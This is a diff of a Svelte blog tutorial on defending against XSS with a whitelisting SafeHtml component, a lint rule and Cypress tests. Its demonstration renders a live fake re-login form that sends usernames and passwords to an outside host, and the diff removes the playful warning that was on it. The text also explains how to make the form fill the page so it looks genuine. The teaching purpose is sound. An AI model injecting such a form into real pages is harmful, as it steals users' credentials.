@@ -14,7 +14,7 @@
   </li>
   <li>Replace usages of <kbd>@html</kbd> with our new <kbd>SafeHtml</kbd> component instead.</li>
   <li>Add a custom svelte lint rule, so we don't have to remember to use <kbd>SafeHtml</kbd> instead of <kbd>@html</kbd>.</li>
-  <li>And add cypress component tests to assert <kbd>SafeHtml</kbd> does what it's supposed to do.</li>
+  <li>Add cypress component tests to assert <kbd>SafeHtml</kbd> does what it's supposed to do.</li>
 </ul>
 
 <h2>XSS explanation and example</h2>
@@ -27,7 +27,7 @@
 
 <p>
   This can be handy if you want to give users a WYSIWYG editor to make dynamic 
-  rich content to display on your site. But if you give them that kind of power, you want to limit it, so you don't end up showing something like:
+  rich content to display on your site. But if you give them that kind of power, you want to limit it so you don't end up showing something like:
 </p>
 
 <Code value={`...
@@ -42,12 +42,12 @@
 ...`} />
 
 <p>
-  And you'll of course see:
+  Your users will see this form:
 </p>
 
 <p>    
   {@html `
-    <p>Pleas login again (DON'T THO)</p>
+    <p>Pleas login again</p>
     <form action="https://johnschottler.com">
       <input placeholder="username" />
       <input placeholder="password" />
@@ -56,9 +56,10 @@
   `}
 </p>
 
+<p>If they fill it in and submit it, malicious nasty boy will receive those credentials and do malicious nasty things with them.</p>
+
 <p>
-  That form is pretty obviously <em>not</em> something you should fill in with real un/pw combo.
-  It'd be more convincing if it was also be styled to look <em>exactly</em> like your site's login page. 
+  That form would be more convincing if it was also styled to look <em>exactly</em> like your site's login page. 
   If it was done well enough, that could even fool a technical person who knows how XSS attacks can work if they're just going about their business.
   The attacker could use an inline style attribute using <kbd>z-index/position/height/width/etc</kbd>, so the form takes up the entire page and looks more 
   legitimate.
@@ -71,7 +72,7 @@
 
 <h2>SafeHtml.svelte</h2>
 <p>
-  Your site may have different needs, so only open up html syntax that it will need. And think about how <em>those</em> whitelisted elements could still be used for XSS attacks.
+  So let's only allow certain whitelisted elements, attributes, and style properties. Your site may have different needs, so only open up html syntax that it will need. And think about how <em>those</em> whitelisted elements could still be used for XSS attacks.
 </p>
 
 <Code title="SafeHtml.svelte" maxHeight="30rem" value={SafeHtml} />
@@ -79,14 +80,14 @@
 <h2>Custom eslint rule</h2>
 <p>
   We don't want to have to remember to not use <kbd>@html</kbd>, so 
-  let's enforce using <kbd>SafeHtml</kbd> instead of <kbd>@html</kbd> it at the lint level, before our 
-  tests even get run, before it'd ever have a chance to get into any of our environments.
+  let's enforce using <kbd>SafeHtml</kbd> instead of <kbd>@html</kbd> it at the lint level. 
+  That way, a usage of <kbd>@html</kbd> would never have a chance to get into any of our environments.
 </p>
 
 <p>
   To make a custom svelte eslint rule in addition to what 
   <a href="https://github.com/sveltejs/eslint-plugin-svelte3" target="_blank">eslint-plugin-svelte3</a> does for us
-  would require an article of it's own, which I'll probably do. So I'll just keep this fairly highlevel here.
+  would require an article on it's own, so I'll just keep this fairly high-level here.
 </p>
 
 <ul>
@@ -107,7 +108,7 @@
   Additionally, we want to make sure our <kbd>SafeHtml</kbd> does what it's supposed 
   to do, so we can modify it going forward with less concern about breaking it or re-opening up for an attack by accident.
 </p>
-<p>Again, testing with Cypress is an article of it's own that I'll probably write in the future, but here are some tests we could do:</p>
+<p>Let's test our component with <a target="_blank" href="https://www.cypress.io/">cypress</a>:</p>
 
 <p><img src="/images/SafeHtml-cypress-component-tests.jpg" alt="SafeHtml-cypress-component-tests.jpg" /></p>
 
@@ -115,6 +116,6 @@
 
 <h2>Replace usages of <kbd>@html</kbd> with <kbd>SafeHtml</kbd></h2>
 <p>If you have a larger app that's making heavy use of <kbd>@html</kbd>, you can use this script to replace those usages and also add an <kbd>import</kbd> statement accordingly.</p>
-<Code title={`Replace \{@html ...\} with SafeHtml.svelte`} value={ReplaceHtmlWithSafeHtml} />
+<Code title="replace-html-with-safehtml.js" value={ReplaceHtmlWithSafeHtml} />
 
 <p>There you have it. Now, even if your backend isn't html encoding or cleaning html strings on the way into the db, your front-end should handle it just fine!</p>
